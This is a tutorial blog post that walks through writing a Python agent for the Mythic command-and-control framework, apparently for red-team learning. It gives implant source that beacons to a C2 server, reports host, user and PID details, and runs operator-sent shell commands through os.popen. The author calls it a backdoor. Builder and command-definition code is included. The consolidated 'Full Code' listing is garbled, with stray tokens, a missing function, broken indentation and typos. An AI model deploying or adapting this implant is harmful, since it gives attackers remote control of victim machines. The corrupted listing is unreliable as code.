# Creating a Mythic Agent (In Python)
## Introduction
During my time learning cyber, I have encountered a couple Mythic Agents running in lab environments.  Mythic seemed like an effective C2 framework, so I figured I'd make an agent myself.  
Is there a better way to learn a system than develop it yourself?  I think not!  I will be developing this in Python3, so code snippets and data syntax will reflect this.

## Environment Setup
My environment was a pretty easy setup.  I am running Ubuntu 22.04 on VMWare Workstation 16 Pro. 
As for Mythic itself, I followed the setup instructions available [here.](https://docs.mythic-c2.net/installation)  This included even the Docker installation!
If all you wanted was a working C2 server with off the shelf payloads, you can stop here and you'll have a working C2 framework!  Pretty cool huh?!

## Layout of a Mythic Payload/Agent (on the development side)
When developing a Mythic agent for the first time, the heirarchy of the payload/agent itself can be confusing at first.  Here is a basic breakdown of the files/folders and their purposes:
```
└── Example_Payload_Type		# This is the root folder of the agent/payload
    ├── agent_code			# This folder contains all the code that will actually be used in the payload sent to the victim.  If the agent supports dynamically added functions, they will be files in this directory as well.
    │   └── base_agent.py		# base_agent.py is the code that contains the groundwork for the agent.  If the agent does not support dynamic addition of functions, this file will also contain all the functionality of the agent.
    ├── Dockerfile			# The dockerfile contains the information necessary to make the docker container for the payload builder
    └── mythic				# This directory contains the code about the building/usage of the agent on the server's/building end
        ├── agent_functions		# Agent functions are the functions the agent supports.  Each one gets its own file to tell Mythic how to utilize the function
        │   ├── builder.py		# builder.py tells the docker container how to build the actual payload from the code in agent_functions.  It also contains metadata about the agent
        │   ├── exit.py			# exit.py is the agent function that exits the payload.  This file contains information for Mythic about how it operates
        │   ├── __init__.py		# Not going to lie, I have no idea what this does.  My research indicates that it's a depricated part of how python used to import certain libraries.  I didn't touch it
        │   └── shell.py		# shell.py is another agent function that exists in the payload.  It contains info for Mythic about how it operates
        ├── browser_scripts		# Browser scripts are js files that provide more functionality in the Mythic web console for the use of each command.  The browser script a function uses is specified in its agent_functions file.  As I did not develop any of these, I will not be going into detail on them.   
        │   ├── clipboard_new.js	
        │   ├── download_new.js
        │   ├── list_apps_new.js
        │   ├── ls_new.js
        │   └── screenshot_new.js
        ├── mythic_service.py		# These three files are base configurations about the agent.  I did not do anything wacky in my development, so I stuck with the base ones.  
        ├── payload_service.sh
        └── rabbitmq_config.json

```

## Metadata of an Agent
The first thing a Mythic agent needs is a dictionary of information about the agent that will be referenced in many parts of the code.  So, in my base_agent.py script, I added this first.  
```
agent = {
	"Server":"callback_host",
	"Port":"callback_port",
	"URI":"/post_uri",
	"PayloadUUID":"UUID_Here",
	"UUID":"",
	"Headers":headers,
	"HostHeader":"domain_front",
	"Sleep": callback_interval,
	"Jitter":callback_jitter,
	"KillDate":"killdate",
	"Script":""
}
```
The trick is to leave all these values with these placeholder names like "headers" and "killdate" (please note that in the agent dictionary, they are not in quotes.  These are not strings).  These placeholder values will be replacd in builder.py to contain values that we give it when building the payload from the web UI. 

## Heartbeat of a Mythic Agent
Mythic agents operate entirely by sending pre-defined messages between the agent and the C2 server.  These look like:
Agent to Server:
```
message = {
		"action":"post_response",  # This is specific to the HTTP C2 profile, which I am using
		"responses":[{"task_id":task["id"],}],
	}
```
Server to Agent:
```
message = {
		"task":
	}
```
(There is more data in the server to agent message, but this is effectively all we are concerned with for the scope of this post)

Every X seconds (specified when creating the payload, normally 10), the agent sends a callback message (the agent to server message) to the server.  Most of the time, this contains little to no information about the current state of the agent.  The server then sends commands/actions/tasks to the agent every time there is a check in from the agent.  Once a command was tasked to the payload, it will execute the command/task, and the next agent to server message will contain the output of that command/task.  Each task has a UUID and gets its own data entry in the "responses" section of the message.  This exchange is the core of how Mythic agents operate. 

### The Check-In Message
Before the server can contact the agent, connection between the two must be made.  This is known as check-in.  There is a special message sent from the agent to the server to initiate the connection and provide the server with information about the agent's host.  This message is in the format:
```
message = {
                "action":  	# Defaults to "check_in" to let the server know that is what is going on
                "ip":		# The IP of the agent's host
                "os":		# The OS of the agent's host
                "user":		# The user the agent is running on on it's host
                "host":		# The hostname of the agent's host
                "domain":	# If applicable, the domain name of the agent's host
                "pid":		# The PID of the process the agent is running on
                "uuid":,	# The UUID of the payload.  This one is super important as it links the payload metadata and listener in the server with the actual payload running on the victim
                "architecture": # The architecture of the OS the agent is running on
        }
```
This message will populate metadata about the agent on the server, to provide more information about what commands are available and allow better use of OPSEC utilities.  

###  C2 Profiles/HTTP
The way that the agent and server sends these messages back and forth is dictated by the C2 profile selected when generating the payload.  Examples of C2 profiles include HTTP, raw TCP, or even methods as strange as steganography in twitter image uploads.  The freedom here is almost limitless.  C2 profiles have their own development process and they must be implemented in the agents to be used in.  Since there is much complexity included in creating a new C2 Profile, I am going to use the standard HTTP C2 profile for this article. (But I might do my own C2 profile in the future!) 
The HTTP profile uses POST requests to communicate.  On the server's side, it runs a web server that listens for POST requests, which the agent makes to check in, with the agent to server message being the data in the POST body.  The server takes that information, and responds with the server to agent message in the POST response.  This way, no ports need to be opened or servers spun up on the agent's host, providing quieter and more universal execution. 

## Time to Code
Now that we know how the agent runs, we can start adding some actual code to our Python script.  Since sending messages back and forth between the server and the agent is the most integral task, I am going to get HTTP Post requests running first.  I did this in a function, so it can be used by many other parts of the code.  
```
def PostRequest(data):
	Headers = []
	for i in agent["Headers"]:		# Here is our first reference to the "agent" dictionary
		Headers.append({i["key"]:i['value']})
	try:
		r = rq.post(agent["Server"]+agent["URI"], data, Headers)
		return r.content
	except Exception as e:
		return e
```
This is a pretty simple function that uses requests (imported as rq) to send a post request with a body and headers.  The reason for the try/except block, is that we don't want the agent crashing in the event something goes awry.  It would be better to skip a command/task than completely lose access to the agent.  

### JSON, not Dictionaries
Anytime we send a message to the C2 server, it has to be encoded and in JSON format.  Since Python dictionaries are not the same as JSON, I made another function to convert from dictionaries to JSON and then encode it for transmission. 
```
def getEncodedJson(data,uuid):
	jsonData = json.dumps(data)
	sendData = uuid+str(jsonData)
	return base64.b64encode(sendData.encode())
```
Quick note: The second line of that function, that concatenates the uuid with the JSON data is another part of the messaging system.  Each time data is sent from the agent to the server, the first 36 characters must be the UUID of the agent, so it can be identified to the server before doing anything with the actual data sent.  

### Time to Check-In!
Now that we have all the necessary groundwork laid, we can actually write the code to connect to the server!  As mentioned before, the first step is to make the check-in call, so the server knows that this agent is alive, and which payload it belongs to. 
```
def SendCheckin():
	data = { 			# This is the message data discussed a few sections up, just with the fields populated
		"action":"checkin",
		"ip":socket.gethostbyname(socket.gethostname()),
		"os":platform.release(),
		"user":os.getlogin(),
		"host":socket.gethostname(),
		"domain":"",
		"pid":os.getpid(),
		"uuid":agent["PayloadUUID"],
		"architecture":platform.system()
	}
	
	response = PostRequest(getEncodedJson(data,agent["PayloadUUID"]))	# Here is where the magic happens!  This one line uses both the getEncodedJson function and PostRequest!
	decodedResponse = base64.b64decode(response)[36:]
	print("Mythic Response: " + str(decodedResponse))			# I like debugging with print statments.  So sue me. 
	
	responseData = json.loads(decodedResponse)
	
	if responseData["status"] == "success":
		agent["UUID"] = responseData["id"]
		return True
	else:
		return False
```
With just these three functions, we can actually test this!  If we create a payload in Mythic, and copy the payload's UUID into the agent["PayloadUUID"] key/value pair, we can call the SendCheckin() function, and we should see a callback show up in the Mythic web UI!

### Let's Put this Thing to Work
We have connection to the C2 server and a way to send and recieve messages!  Now lets work on recieving tasks from the server and executing them!  Since we already know the format the tasks will be sent in, all we have to do is parse through that every time we send a callback and run the commands it gives us.  There is just one catch.  We don't have callbacks set up yet.  Let's do that now!
All the callback really does is say, "Hey server, I'm bored.  Do you have anything for me to do?".  To which, the servers might respond with some tasks.  

```
def getTasks():
	data = {			# Here is a slightly modified agent to server message that asks for 1 task to do.  If more than one is queued up on Mythic's end, it will send them one at a time, in FIFO order
		"action":"get_tasking",
		"tasking_size":1,
	}
	sendData = getEncodedJson(data,agent["UUID"])	# Send the message to the server
	response = PostRequest(sendData)		# Get the response
	decodedResponse = base64.b64decode(response)[36:]	# Decode it, remove the UUID from the front of it, and all that jazz
	print("Mythic Response: " + str(decodedResponse))	# Yeesss, more print statments for debugging (these can seriously help, I promise)
	
	responseData = json.loads(decodedResponse)["tasks"]	# Now here's the magic of this function.  We take the JSON we just got from the server, and use json.loads to load the "tasks" section of the JSON data into responseData.  This will give us a Python list form of the task we recieved.  
	
	if len(responseData) > 0:		# And some error checking because it's good form.  
		res = responseData[0]		# Because we only get one task, we only want to return the first item in the list.  This could be updated later to get all the currently queued tasks, but for simplicity's sake, I am going to leave it with just one.  
		print("RESPONSE" + str(res))
		return res			# Return the one task we got
```

Now that we can get tasks, we should run them!  This is really just parsing with an if/elif/else block.   

```
 def runTask(task):					# Pass it the task
	print(task)
	data = {					# Create the base agent to server message to fill out with data as we go
		"action":"post_response",
		"responses":[{"task_id":task["id"],}],
		}
		
	if task['command'] == "shell":			# If the command is 'shell', get the parameters (from JSON because of course it is) and run the shell() function
		command = json.loads(task['parameters'])
		print(command)
		returnVal = shell(command["command"])
		data["responses"][0]["user_output"] = returnVal  # Set the value of the "user_output" for this task to be the return value from running shell()

	elif task['command'] == "exit":		# Otherwise, it the command is 'exit', guess what we do!  We exit!
		returnVal = "Exited"
		ex()				# Using the exit function
	else:
		returnVal = "Not Implemented"	# Otherwise, just tell the server this function isn't implemented yet.
		data["responses"][0]["user_output"] = returnVal
	
	response = PostRequest(getEncodedJson(data,agent["UUID"]))	# And here's where we do all the standard HTTP stuff
	decodedResponse = base64.b64decode(response)[36:]
	print("Task - Mythic Response: " + str(decodedResponse))
	return True
```
 
The functions (like shell and ex) need to be coded too, so I'm going to do those next.
```
def shell(param):
	cmd = os.popen(param)
	return cmd.read()
	
def ex():
	print("EXITING")
	exit()
```
These are really basic.  Does exit really need it's own function?  Not really, but I am going for as modular/OOP as I can get, so I did anyway.  

### The Driver
Those were all the functions in the agent!  Now all that's left is to string them together to make the loop the agent runs.  
```
tasks = []				# This will hold all the tasks recieved.  It only holds one at a time right now, but as I mentioned earlier, this could be extended.

print(SendCheckin())			# Send the Check-in message first thing
while True:				# Your clasic while True loop
	print("Contacting C2")
	task = getTasks()		# Get the task from the server
	tasks.append(task)		# Add the task we got to the task list		
	if tasks[0] == None:		# If there was not a task to get,
		tasks.pop(0)		#   then pop the task, as it will be the "get tasks" task
	if len(tasks) > 0:		# After we removed that one, if we still have tasks to run,
		if runTask(tasks[0]):	# Run the first task and pop it off the list
			tasks.pop(0)
		else:
			print("Error running: " + tasks[1])
			taks.pop(0)
	time.sleep(agent["Sleep"])	# Sleep until the next callback 
			
```
And with that, we have a fully functioning Mythic Agent written in Python3 that is useable right now!  There is just no metadata for Mythic to know it's good to go though.  

### Full Code
The full picture looks like this now:  
```
import requests as rq
import socket
import platform
import os
import json
import base64
import time 
agent = {
	"Server":"callback_host",
	"Port":"callback_port",
	"URI":"/post_uri",
	"PayloadUUID":"UUID_Here",
	"UUID":"",
	"Headers":headers,
	"HostHeader":"domain_front",
	"Sleep": callback_interval,
	"Jitter":callback_jitter,
	"KillDate":"killdate",
	"Script":""
}

def PostRequest(data):
	Headers = []Ch
	for i in agent["Headers"]:
		Headers.append({i["key"]:i['value']})
	try:
		r = rq.post(agent["Server"]+agent["URI"], data, Headers)
	return r.content
	except Exception as e:
		return e

def getEncodedJson(data,uuid):Tas;k
	jsonData = json.dumps(data)
	sendData = uuid+str(jsonData)
	return base64.b64encode(sendData.encode())

def SendCheckin():
	data = {
		"action":"checkin",
		"ip":socket.gethostbyname(socket.gethostname()),
		"os":platform.release(),
		"user":os.getlogin(),
		"host":socket.gethostname(),
		"domain":"",
		"pid":os.getpid()
		"uuid":agent["PayloadUUID"],
		"architecture":platform.system()
	}
	response = PostRequest(getEncodedJson(data,agent["PayloadUUID"]))
	decodedResponse = base64.b64decode(response)[36:]
	print("Mythic Response: " + str(decodedResponse))
	
	responseData = json.loads(decodedResponse)
	
	if responseData["status"] == "success":
		agent["UUID"] = responseData["id"]
		return True
	else:
		return False
		


def runTask(task):
	print(task)
	data = {
		"action":"post_response",
		"responses":[{"task_id":task["id"],}],
		}
		
	if task['command'] == "shell":PID
		command = json.loads(task['parameters'])
		print(command)
		returnVal = shell(command["command"])

		data["responses"][0]["user_output"] = returnVal
	elif task['command'] == "exit":
		returnVal = "Exited"
		ex()
	else:
		returnVal = "Not Implemented"
		data["responses"][0]["user_output"] = returnVal
	
	response = PostRequest(getEncodedJson(data,agent["UUID"]))
	decodedResponse = base64.b64decode(response)[36:]
	print("Task - Mythic Response: " + str(decodedResponse))
	return True
	
def shell(param):
	cmd = os.popen(param)
	return cmd.read()
	
def ex():
	print("EXITING")
	exit()

tasks = []

print(SendCheckin())
while True:
	print("Contacting C2")
	task = getTasks()
	tasks.append(task)
	#print(tasks)
	#print(len(tasks))
	if tasks[0] == None:
		tasks.pop(0)
	if len(tasks) > 0:
		if runTask(tasks[0]):
			tasks.pop(0)
		else:
			print("Error running: " + tasks[1])
			taks.pop(0)
			
	time.sleep(agent["Sleep"])
```
<br>

## Building Time
In addition to all the metadata, the payload also has to be built.  This is done with builder.py in agent_functions.  I primarily used the one provided in the Example_Payload_Type included in the Mythic framework and edited it as I needed.  
```
from mythic_payloadtype_container.PayloadBuilder import *
from mythic_payloadtype_container.MythicCommandBase import *
from mythic_payloadtype_container.MythicRPC import *
import sys
import json
```
Yeah yeah, import all the things.

Here's the start of the metadata.  (Note: I called this Medusa after snakes and the whole greek gods theme of Mythic.  It turns out that there is already a Python agent called Medusa.  This one is entirely unrelated to that one.  I will probably change it at some point to help with confusion.)
```
#define your payload type class here, it must extend the PayloadType class though
class Medusa(PayloadType):

    name = "medusa"  # name that would show up in the UI
    file_extension = "py"  # default file extension to use when creating payloads
    author = "@darkwire37"  # author of the payload type
    supported_os = [  # supported OS and architecture combos
        SupportedOS.Linux # update this list with all the OSes your agent supports
    ]
    wrapper = False  # does this payload type act as a wrapper for another payloads inside of it?
    # if the payload supports any wrapper payloads, list those here
    wrapped_payloads = [] # ex: "service_wrapper"
    note = "Should run on anything that runs python3"
    supports_dynamic_loading = False  # setting this to True allows users to only select a subset of commands when generating a payload
    build_parameters = [
        #  these are all the build parameters that will be presented to the user when creating your payload
        # we'll leave this blank for now
    ]
    #  the names of the c2 profiles that your agent supports
    c2_profiles = ["http"]
    translation_container = None
```
The next bit of code is where the building actually happens
```
    # after your class has been instantiated by the mythic_service in this docker container and all required build parameters have values
    # then this function is called to actually build the payload
    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        base_code = open(self.agent_code_path / "base_agent.py", "r").read()
        base_code = base_code.replace("UUID_Here",self.uuid)
        for c2 in self.c2info:
            profile = c2.get_c2profile()["name"]
            for key, val in c2.get_parameters_dict().items():
                for c2 in self.c2info:
                    profile = c2.get_c2profile()["name"]
                    for key, val in c2.get_parameters_dict().items():
                        if not isinstance(val, str):
                            base_code = base_code.replace(key, \
                            json.dumps(val).replace("false", "False").replace("true","True").replace("null","None"))
                        else:
                            base_code = base_code.replace(key, val)
        resp = BuildResponse(status=BuildStatus.Success)
        resp.payload = base_code.encode()
        return resp
```
All of that "base_code.replace" code replaces the values that the C2 Profile and payload are given when creating the payload in the web UI and are passed as a dictionary to the build process.  So, this will replace anything in base_agent.py that matches exactly callback_server with the IP address specified in the HTTP C2 profile.  Some of this code to do the replacing, I took from the real Medusa, as the documentation on the actual contents of this dictionary is not documented anywhere I could find.  
After it replaces everyhting, it returns the built payload for download!

### Agent Functions
Agent functions are kind of weird.  They tell the Mythic server what to do with each function available and shows them as available to the user (as well as a ton of other really powerfull stuff that I won't be getting into here).  I will show just one example, shell.py to explain how these work.  exit.py is pretty self explanatory once you understand agent functions.  I mostly used the example code provided with the Mythic framework, so most of this is written by @its_a_feature_ and just edited by me.  .
```
# Originally written by @its_a_feature_, adapted by @darkwire

from mythic_payloadtype_container.MythicCommandBase import *
from mythic_payloadtype_container.MythicRPC import *
```
More imports

Now, this first class, ShellArguments, tells the server what kind of params to require to run the shell function.  No sense sending a command to the agent, just for it to do nothing.  
```

class ShellArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [				# These are the arguments required by the function
            CommandParameter(name="command", display_name="Command", type=ParameterType.String, description="Command to run"),
        ]

    async def parse_arguments(self):	# This parses the arguments and provides errors to the user when the requirements aren't met
        if len(self.command_line) == 0:
            raise ValueError("Must supply a command to run")
        self.add_arg("command", self.command_line)
			
    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)
```

ShellOpsec is a very interesting class, as it can check for things about the victim prior to, and after running a command.  All I do in this one is inform the user how the process is being created, in case they are aware of an endpoint detection system on the victim that will create an alert or kill the process.
```
class ShellOpsec(CommandOPSEC):
    injection_method=""
    process_creation="os.popen(,shell=True)"
    authentication=""
    async def opsec_pre(self, task: MythicTask):
        task.opsec_pre_message= "This runs os.popen(), just FYI"

    async def opsec_post(self, task: MythicTask):
        task.opsec_pre_message= "You just ran os.popen()!!!"
```

ShellCommand is the primary class of the agent function file.  It provides info to the server about what it does and how it does it.  
```
class ShellCommand(CommandBase):
    cmd = "shell"
    needs_admin = False
    help_cmd = "shell {command}"
    description = "Calls a command with python os.popen"
    version = 1
    author = "@darkwire"
    attackmapping = ["T1059"]
    argument_class = ShellArguments
    opsec_class = ShellOpsec
    attributes = CommandAttributes(		# More info about these attributes are available on the Mythic docs page
        spawn_and_injectable=False,
        builtin=True,
        load_only=False,
        suggested_command=False)

    async def create_tasking(self, task: MythicTask) -> MythicTask:		# This will create artifacts for the Mythic server for each task created
        resp = await MythicRPC().execute("create_artifact", task_id=task.id,
            artifact="os.popen({},shell=True)".format(task.args.get_arg("command")),
            artifact_type="Process Create",
        )
        resp = await MythicRPC().execute("create_artifact", task_id=task.id,
            artifact="{}".format(task.args.get_arg("command")),
            artifact_type="Process Create",
        )
        task.display_params = task.args.get_arg("command")
        return task

    async def process_response(self, response: AgentResponse):			# This can provide special ways to process the response, but I am not including any.  
        pass
```

### That's All, Folks!
And with that, the agent is complete!  It has enough functionality to be either a plain backdoor, or be a starting point to be extended upon!  For more information about Mythic and development of Mythic agents, please refer to the (Mythic Docs)[https://docs.mythic-c2.net/].  
All the code for this agent will be available on my GitHub.  
Thank you for reading!  
